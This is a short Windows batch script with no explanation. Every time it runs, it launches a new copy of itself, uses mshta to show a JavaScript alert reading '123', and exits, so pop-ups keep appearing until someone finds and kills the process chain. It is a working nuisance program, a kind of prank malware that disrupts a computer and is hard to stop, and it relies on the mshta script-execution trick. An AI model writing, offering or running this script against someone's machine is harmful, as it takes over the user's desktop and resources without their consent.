@echo off
:loop
start "" "%~f0"
mshta "javascript:alert('123');close();"
exit
